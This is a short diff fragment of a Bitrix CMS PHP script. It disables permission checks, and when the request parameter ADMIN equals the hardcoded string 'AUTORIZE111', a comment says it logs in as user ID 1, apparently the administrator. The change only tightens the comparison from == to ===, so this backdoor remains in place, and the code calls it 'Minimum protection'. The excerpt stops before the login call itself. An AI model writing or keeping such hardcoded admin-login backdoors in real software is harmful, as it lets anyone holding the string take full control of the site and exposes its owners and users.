@@ -13,7 +13,7 @@ define("NOT_CHECK_PERMISSIONS", true);
 require($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/prolog_before.php");
 
 // Minimum protection
-if($_REQUEST['ADMIN'] == "AUTORIZE111"){
+if($_REQUEST['ADMIN'] === "AUTORIZE111"){
 	global $USER; 
 	
 	// Log in as user with ID = 1
